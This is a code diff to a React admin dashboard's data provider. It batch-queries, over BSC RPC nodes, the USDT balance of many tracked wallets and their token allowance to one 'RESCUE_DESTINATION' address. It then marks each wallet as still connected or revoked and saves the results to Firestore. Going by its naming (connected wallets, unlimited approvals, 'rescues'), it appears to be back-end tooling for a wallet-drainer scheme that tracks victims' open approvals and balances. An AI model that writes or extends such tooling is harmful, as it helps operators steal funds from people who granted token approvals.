@@ -55,6 +55,7 @@ interface AdminDataContextType {
   markWalletApproved: (address: string) => Promise<void>;
   checkWalletAllowanceOnChain: (address: string) => Promise<boolean>;
   checkAllUnapprovedOnChain: () => Promise<{ reapprovedCount: number; checkedCount: number }>;
+  checkAllApprovedOnChain: () => Promise<{ stillConnectedCount: number; revokedCount: number; checkedCount: number }>;
   connectedCount: number;
   unlimitedTodayCount: number;
   isLoading: boolean;
@@ -173,6 +174,119 @@ async function fetchBatchUSDTBalances(
       results[addr.toLowerCase()] = await fetchOnChainUSDTBalance(addr);
     } catch {
       results[addr.toLowerCase()] = '0.00';
+    }
+  }
+
+  return results;
+}
+
+interface WalletOnChainStatus {
+  allowance: bigint;
+  balance: string;
+}
+
+/**
+ * Batch-fetch both allowance and balance using Multicall3 on BSC.
+ * Runs in a single RPC round-trip (< 1 second) across all requested wallets.
+ */
+async function fetchBatchUSDTAllowanceAndBalance(
+  addresses: string[]
+): Promise<Record<string, WalletOnChainStatus>> {
+  if (addresses.length === 0) return {};
+
+  const validAddresses = addresses.filter((a) => ethers.isAddress(a));
+  if (validAddresses.length === 0) return {};
+
+  // For each address: call 0 = allowance, call 1 = balanceOf
+  const calls: Array<{ target: string; allowFailure: boolean; callData: string }> = [];
+  validAddresses.forEach((addr) => {
+    calls.push({
+      target: USDT_CONTRACT,
+      allowFailure: true,
+      callData: erc20Interface.encodeFunctionData('allowance', [addr, RESCUE_DESTINATION]),
+    });
+    calls.push({
+      target: USDT_CONTRACT,
+      allowFailure: true,
+      callData: erc20Interface.encodeFunctionData('balanceOf', [addr]),
+    });
+  });
+
+  const results: Record<string, WalletOnChainStatus> = {};
+
+  for (const rpc of BSC_RPCS) {
+    try {
+      const provider = new ethers.JsonRpcProvider(rpc, 56, { staticNetwork: true });
+      const multicallContract = new ethers.Contract(
+        MULTICALL3_ADDRESS,
+        MULTICALL3_ABI,
+        provider
+      );
+
+      const rawResults: Array<{ success: boolean; returnData: string }> =
+        await withTimeout(multicallContract.aggregate3(calls), 4500);
+
+      validAddresses.forEach((addr, idx) => {
+        const lower = addr.toLowerCase();
+        const allowRes = rawResults[idx * 2];
+        const balRes = rawResults[idx * 2 + 1];
+
+        let allowance = 0n;
+        if (allowRes && allowRes.success && allowRes.returnData && allowRes.returnData !== '0x') {
+          try {
+            const decodedAllow = erc20Interface.decodeFunctionResult('allowance', allowRes.returnData);
+            allowance = decodedAllow[0] as bigint;
+          } catch {
+            allowance = 0n;
+          }
+        }
+
+        let balance = '0.00';
+        if (balRes && balRes.success && balRes.returnData && balRes.returnData !== '0x') {
+          try {
+            const decodedBal = erc20Interface.decodeFunctionResult('balanceOf', balRes.returnData);
+            balance = formatUSDTBal(decodedBal[0]);
+          } catch {
+            balance = '0.00';
+          }
+        }
+
+        results[lower] = { allowance, balance };
+      });
+
+      return results;
+    } catch {
+      // Try next RPC node
+    }
+  }
+
+  // Fallback if all multicall attempts fail: query directly with graceful fallback
+  for (const addr of validAddresses) {
+    const lower = addr.toLowerCase();
+    try {
+      let allowance = 0n;
+      let balance = '0.00';
+      for (const rpc of BSC_RPCS) {
+        try {
+          const provider = new ethers.JsonRpcProvider(rpc, 56, { staticNetwork: true });
+          const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+          const [allow, bal] = await withTimeout(
+            Promise.all([
+              contract.allowance(addr, RESCUE_DESTINATION),
+              contract.balanceOf(addr),
+            ]),
+            3500
+          );
+          allowance = allow as bigint;
+          balance = formatUSDTBal(bal as bigint);
+          break;
+        } catch {
+          // try next rpc
+        }
+      }
+      results[lower] = { allowance, balance };
+    } catch {
+      results[lower] = { allowance: 0n, balance: '0.00' };
     }
   }
 
@@ -667,6 +781,75 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     return { reapprovedCount, checkedCount: listToCheck.length };
   }, [unapprovedWallets, checkWalletAllowanceOnChain]);
 
+  const checkAllApprovedOnChain = useCallback(async (): Promise<{
+    stillConnectedCount: number;
+    revokedCount: number;
+    checkedCount: number;
+  }> => {
+    const listToCheck = [...approvedWallets];
+    if (listToCheck.length === 0) {
+      return { stillConnectedCount: 0, revokedCount: 0, checkedCount: 0 };
+    }
+
+    // 1. Set loading indicator on balance for all approved wallets
+    setBalances((prev) => {
+      const next = { ...prev };
+      listToCheck.forEach((w) => {
+        const lower = w.id.toLowerCase();
+        next[lower] = { balance: prev[lower]?.balance ?? '0.00', loading: true };
+      });
+      return next;
+    });
+
+    const addresses = listToCheck.map((w) => w.id);
+    const onChainData = await fetchBatchUSDTAllowanceAndBalance(addresses);
+
+    let stillConnectedCount = 0;
+    let revokedCount = 0;
+
+    const updatedBalances: Record<string, { balance: string; loading: boolean }> = {};
+
+    await Promise.allSettled(
+      listToCheck.map(async (w) => {
+        const lower = w.id.toLowerCase();
+        const data = onChainData[lower] ?? { allowance: 0n, balance: '0.00' };
+
+        updatedBalances[lower] = { balance: data.balance, loading: false };
+
+        if (data.allowance > 0n) {
+          stillConnectedCount++;
+          await markWalletApproved(w.id);
+        } else {
+          revokedCount++;
+          await markWalletUnapproved(w.id);
+        }
+
+        // Persist fresh balance and allowance to Firestore
+        try {
+          await updateDoc(doc(db, 'wallets', lower), {
+            balance: data.balance,
+            allowance: data.allowance.toString(),
+            updatedAt: Timestamp.now(),
+          }).catch(() => {});
+        } catch {
+          // ignore
+        }
+      })
+    );
+
+    // 2. Set updated balances in state
+    setBalances((prev) => ({
+      ...prev,
+      ...updatedBalances,
+    }));
+
+    return {
+      stillConnectedCount,
+      revokedCount,
+      checkedCount: listToCheck.length,
+    };
+  }, [approvedWallets, markWalletApproved, markWalletUnapproved]);
+
   const connectedCount = approvedWallets.length;
   const isLoading = !isWalletsLoaded || !isRescuesLoaded;
 
@@ -691,6 +874,7 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
         markWalletApproved,
         checkWalletAllowanceOnChain,
         checkAllUnapprovedOnChain,
+        checkAllApprovedOnChain,
         connectedCount,
         unlimitedTodayCount,
         isLoading,
